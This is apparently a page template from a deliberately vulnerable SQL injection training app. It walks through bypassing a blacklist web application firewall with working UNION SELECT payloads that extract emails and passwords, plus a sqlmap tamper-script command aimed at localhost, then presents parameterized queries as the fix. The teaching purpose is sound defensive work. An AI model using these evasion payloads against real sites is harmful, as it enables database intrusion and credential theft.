<?php if ( ! defined('SQL_INJECTION_IN_PHP') ) die('Direct access not permitted'); ?>

<nav aria-label="breadcrumb" class="mb-3">
  <ol class="breadcrumb">
    <li class="breadcrumb-item"><a href="?action=walkthroughs">Walkthroughs</a></li>
    <li class="breadcrumb-item active">WAF Bypass</li>
  </ol>
</nav>

<div class="d-flex align-items-center gap-3 mb-4">
  <h2 class="mb-0">8. WAF Bypass Techniques</h2>
  <span class="badge bg-info">Advanced</span>
  <span class="badge bg-secondary">Evasion</span>
</div>

<div class="card mb-4">
  <div class="card-header bg-dark text-white"><strong>Overview</strong></div>
  <div class="card-body">
    <p>A WAF (Web Application Firewall) inspects HTTP requests and blocks patterns that look like SQL injection. Naive WAFs use keyword blacklists. This demo shows how trivially most blacklist-based WAFs are bypassed.</p>
    <p class="mb-0"><strong>Key lesson:</strong> A WAF is defence-in-depth — it is <strong>not</strong> a substitute for parameterized queries. If your code is vulnerable, a good attacker will bypass the WAF. Fix the root cause first.</p>
  </div>
</div>

<div class="card mb-4 border-danger">
  <div class="card-header bg-danger text-white"><strong>The Naive WAF (what this app uses for demo)</strong></div>
  <div class="card-body">
<pre class="bg-light p-3 rounded"><code>function naive_waf(string $input): string {
    $blacklist = ['SELECT', 'UNION', 'DROP', 'INSERT',
                  'UPDATE', 'DELETE', 'WHERE', 'FROM', '--', '#'];
    return str_ireplace($blacklist, '[BLOCKED]', $input);
}</code></pre>
    <p class="mb-0 text-danger">This blocks obvious keywords. Every technique below evades it.</p>
  </div>
</div>

<div class="card mb-4 border-warning">
  <div class="card-header bg-warning text-dark"><strong>Bypass Techniques — Walkthrough</strong></div>
  <div class="card-body">

    <h6 class="fw-bold">1. Case Variation</h6>
    <p>Many WAFs only block exact case. MySQL is case-insensitive for keywords.</p>
    <div class="bg-light p-2 rounded mb-1"><code>%' UnIoN SeLeCt 1,email,password,4 FrOm user-- </code></div>
    <p class="text-muted small mb-4">Our WAF uses <code>str_ireplace</code> so this is caught — but many real WAFs are case-sensitive.</p>

    <h6 class="fw-bold">2. Inline Comment Obfuscation</h6>
    <p>MySQL treats <code>/**/</code> as whitespace. The WAF sees fragments, not full keywords.</p>
    <div class="bg-light p-2 rounded mb-1"><code>%' UN/**/ION SE/**/LECT 1,email,password,4 FR/**/OM user-- </code></div>
    <p class="text-muted small mb-4">The WAF looks for <code>UNION</code> and <code>SELECT</code> — it finds <code>UN/**/ION</code> and <code>SE/**/LECT</code>. Not blocked. MySQL executes them perfectly.</p>

    <h6 class="fw-bold">3. Hex-Encoded Values</h6>
    <p>String values can be replaced with their hex equivalents. WAFs check for <code>'admin'</code> but not <code>0x61646d696e</code>.</p>
    <div class="bg-light p-2 rounded mb-1"><code>%' UNION SELECT 1,email,password,4 FROM user WHERE account_type=0x61646d696e-- </code></div>
    <p class="text-muted small mb-4"><code>0x61646d696e</code> = <code>admin</code>. MySQL evaluates it directly. The WAF never sees the word 'admin'.</p>

    <h6 class="fw-bold">4. Equivalent SQL Functions</h6>
    <p>WAFs block known dangerous functions but miss lesser-known equivalents.</p>
    <div class="row">
      <div class="col-md-6">
        <div class="bg-light p-2 rounded mb-1"><strong>Blocked:</strong> <code>SUBSTRING(str, 1, 5)</code></div>
        <div class="bg-light p-2 rounded mb-3"><strong>Equivalent:</strong> <code>MID(str, 1, 5)</code>, <code>LEFT(str, 5)</code></div>
      </div>
      <div class="col-md-6">
        <div class="bg-light p-2 rounded mb-1"><strong>Blocked:</strong> <code>SLEEP(3)</code></div>
        <div class="bg-light p-2 rounded mb-3"><strong>Equivalent:</strong> <code>BENCHMARK(50000000, MD5('x'))</code></div>
      </div>
    </div>

    <h6 class="fw-bold">5. Whitespace Substitution</h6>
    <p>SQL accepts tabs, newlines, and form feeds as whitespace. WAF regex patterns often only match spaces.</p>
    <div class="bg-light p-2 rounded mb-1"><code>%'%09UNION%09SELECT%091,email,password,4%09FROM%09user--</code></div>
    <p class="text-muted small mb-4"><code>%09</code> = tab, <code>%0a</code> = newline, <code>%0d</code> = carriage return. All valid SQL whitespace.</p>

    <h6 class="fw-bold">6. Double Keyword Nesting</h6>
    <p>When a WAF does a single-pass strip of keywords, nested duplicates survive:</p>
    <div class="bg-light p-2 rounded mb-1"><code>%' UNUNIONION SESELECTLECT 1,email,password,4 FROM user-- </code></div>
    <p class="text-muted small mb-4">The WAF strips <code>UNION</code> and <code>SELECT</code> once — leaving <code>UNION</code> and <code>SELECT</code> behind. Executes normally.</p>

    <h6 class="fw-bold">7. URL Double Encoding</h6>
    <div class="bg-light p-2 rounded mb-1"><code>%2527</code> → URL decode once = <code>%27</code> → URL decode again = <code>'</code></div>
    <p class="text-muted small mb-4">If the server decodes input twice, the WAF inspecting the first-decoded value sees <code>%27</code> (harmless), but the app uses the second-decoded value <code>'</code> (injection character).</p>

    <a href="?action=waf_bypass&waf=1" class="btn btn-sm btn-outline-danger">Open WAF Bypass Demo (WAF ON) →</a>
  </div>
</div>

<div class="card mb-4 border-success">
  <div class="card-header bg-success text-white"><strong>The Right Fix</strong></div>
  <div class="card-body">
    <p>No amount of WAF tuning fixes a parameterization problem. The right fix is always:</p>
<pre class="bg-light p-3 rounded"><code>// Parameterized query — WAF bypass is irrelevant because
// the input is NEVER interpreted as SQL
$stmt = $pdo->prepare(
    "SELECT id, firstname, lastname, email
     FROM user WHERE firstname LIKE :search"
);
$stmt->execute([':search' => '%' . $input . '%']);</code></pre>
    <p class="mb-0 text-success">A properly parameterized query cannot be bypassed by any WAF bypass technique — because there is nothing to bypass. The input is data, not code.</p>
  </div>
</div>

<div class="card mb-4">
  <div class="card-header bg-dark text-white"><strong>When WAFs Are Useful</strong></div>
  <div class="card-body">
    <ul class="mb-0">
      <li><strong>Virtual patching</strong> — while a code fix is being deployed, a WAF can provide temporary protection.</li>
      <li><strong>Defence in depth</strong> — a properly configured WAF (ModSecurity, AWS WAF, Cloudflare) with OWASP Core Rule Set adds a meaningful layer on top of parameterized queries.</li>
      <li><strong>Logging and alerting</strong> — WAFs can detect and alert on attack attempts even when they don't stop them.</li>
      <li><strong>Legacy systems</strong> — when source code cannot be modified, a WAF in front is the only available control.</li>
    </ul>
  </div>
</div>

<div class="card">
  <div class="card-header bg-secondary text-white"><strong>Tools for WAF Bypass Testing</strong></div>
  <div class="card-body">
    <p><strong>sqlmap with tamper scripts:</strong></p>
    <pre class="bg-light p-2 rounded small">sqlmap -u "http://localhost:8080/profile.php?action=waf_bypass&waf=1&search=test" \
  --tamper=space2comment,between,randomcase \
  --dbs --batch</pre>
    <p class="small mb-2"><strong>Common tamper scripts:</strong></p>
    <ul class="small mb-0">
      <li><code>space2comment</code> — replaces spaces with <code>/**/'</code></li>
      <li><code>randomcase</code> — randomizes keyword case</li>
      <li><code>between</code> — replaces <code>&gt;</code> with <code>NOT BETWEEN 0 AND</code></li>
      <li><code>hex2char</code> — encodes string values as hex</li>
      <li><code>chardoubleencode</code> — double URL-encodes payload</li>
    </ul>
  </div>
</div>
